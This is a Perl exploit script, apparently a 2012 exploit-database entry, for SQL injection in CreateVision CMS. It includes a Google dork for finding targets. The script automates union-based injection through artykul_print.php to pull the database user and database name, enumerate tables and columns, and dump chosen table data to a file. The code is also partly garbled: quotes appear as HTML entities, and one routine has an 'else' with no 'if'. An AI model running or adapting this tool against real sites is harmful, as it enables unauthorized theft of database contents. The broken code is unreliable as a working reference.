#
# Exploit Title: CreateVision CMS Database injection.
# Description: Virtually none of the variables are not filtered.
# Google Dork: inurl:artykul_print.php
# Date: 2012/02/24
# Author : Zwierzchowski Oskar
# Software Link: http://www.createvision.pl/
# Version: All Version
# Security Risk: High
# Tested on: FreeBSD
# Greets: Grzegorz Stachowiak, Damian Blaszczyk, Borislav Kotov.
use strict;
use warnings;
use LWP::Simple;
sub main ()
{
    my %config  = (
    &#039;host&#039;      => &#039;&#039;,
    &#039;columns&#039;   => &#039;,3,4&#039;,
    &#039;column&#039;    => &#039;&#039;,
    &#039;table&#039;     => &#039;&#039;
    );
    my %send    = ();
    getops(\%config);
    getcolumn(\%config, \%send);
    getuser(\%config, \%send);
    getdatabase(\%config, \%send);
    gettables(\%config, \%send);
    otherdata(\%config, \%send);
    return 0;
}
sub getdatabase ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{database};
    analizedata($data, &#039;Database&#039;);
    return ($config, $send);
}
sub getuser ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{user};
    analizedata($data, &#039;User&#039;);
    return ($config, $send);
}
sub gettables ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{column};
    analizedata($data, &#039;Tables&#039;);
}
sub otherdata ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    my $table;
    my $column;
    print "[+]\tIf you want to draw some data? (1 or 2)\r\n\r\n";
    print "[1]\tYes\r\n";
    print "[2]\tNo\r\n";
    $data   = <STDIN>;
    chomp($data);
    if ($data == 2)
    {
        exit 0;
    }
    else
    {
        print "[+]\tName of the table which you want to download (check the output.txt) :\r\n";
        $table  = <STDIN>;
        chomp($table);
        print "[+]\tGet column/s: (ex. column1,column2,column3)\r\n";
        $column = <STDIN>;
        chomp($column);
        $column =~ s/,/,char(58),/g;
        $send->{tables}  = &#039;/artykul_print.php?id=103+and+1=2+union+select+1,concat(&#039;.$column.&#039;)&#039;.$config->{columns}.&#039;+from+&#039;.$table.&#039;--&#039;;
        $data   = get $config->{host}.$send->{tables};
        analizedata($data, &#039;MYDATA&#039;);
    }
    return 0;
}
sub analizedata ($$)
{
    my $data    = shift;
    my $table;
    my $column;
    my @columns = (&#039;&#039;);
    my @tables  = (&#039;&#039;);
    while ($data =~ /<span class=\"tytul_artykulu\">(.*?)<\/span>/g)
    {
        {
            ($table, $column)   = split(/:/, $1);
            save($1, &#039;output.txt&#039;);
            push(@columns, $column);
            if ($table eq $tables[$#tables])
            {
            }
            else
            {
                push(@tables, $table);
            }
        }
        else
        {
            save($1, &#039;output.txt&#039;);
        }
    }
    {
        print "[+]\t".$#columns." columns in ".$#tables." tables\r\n";
        print "[+]\tResults has been saved into output.txt\r\n";
    }
    return 0;
}
sub getops ($)
{
    my $config  = shift;
    if (!$ARGV[0] || $ARGV[0] !~ /http:\/\//)
    {
        print "[+]\tUsage: perl splo.pl http://host.com\r\n";
        exit 0;
    }
    else
    {
        $config->{host}  = $ARGV[0];
    }
    return $config;
}
sub getcolumn ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    for (1..20)
    {
        incrcolum($config);
        $send->{user}        = &#039;/artykul_print.php?id=105+and+1=2+union+select+1,user()&#039;.$config->{columns}.&#039;--&#039;;
        $send->{database}    = &#039;/artykul_print.php?id=105+and+1=2+union+select+1,database()&#039;.$config->{columns}.&#039;--&#039;;
        $send->{column}      = &#039;/artykul_print.php?id=105+and+1=2+union+select+1,concat(table_name,char(58),column_name)&#039;.$config->{columns}.&#039;+from+information_schema.columns--&#039;;
        $data   = get $config->{host}.$send->{user};
        if (index($data, "<span class=\"tytul_artykulu\">") != -1)
        {
            return ($config, $send);
        }
    }
    return $config;
}
sub incrcolum ($)
{
    my $config  = shift;
    my @digits      = split(/,/, $config->{columns});
    my $data        = (($digits[$#digits])+1);
    $config->{columns}   =~ s/$config->{columns}/$config->{columns},$data/g;
    return $config;
}
sub save ($$)
{
    my $data    = shift;
    my $file    = shift;
    open(FILE, ">>".$file."");
    print FILE "".$data."\r\n";
    close FILE;
    return 0;
}
main();



